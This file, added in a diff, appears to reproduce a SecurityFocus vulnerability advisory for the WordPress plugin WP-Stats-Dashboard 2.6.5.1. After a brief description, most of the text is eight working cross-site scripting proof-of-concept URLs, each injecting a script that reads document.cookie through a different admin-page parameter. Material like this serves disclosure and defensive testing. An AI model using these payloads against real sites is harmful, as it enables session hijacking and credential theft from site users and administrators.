@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/49197/info
+
+WP-Stats-Dashboard is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+WP-Stats-Dashboard 2.6.5.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?icon=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?url=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?name=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?type=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?code=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?code=200&username=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/blocks/select-trend.php?onchange=%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/blocks/submenu.php?submenu[%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E]
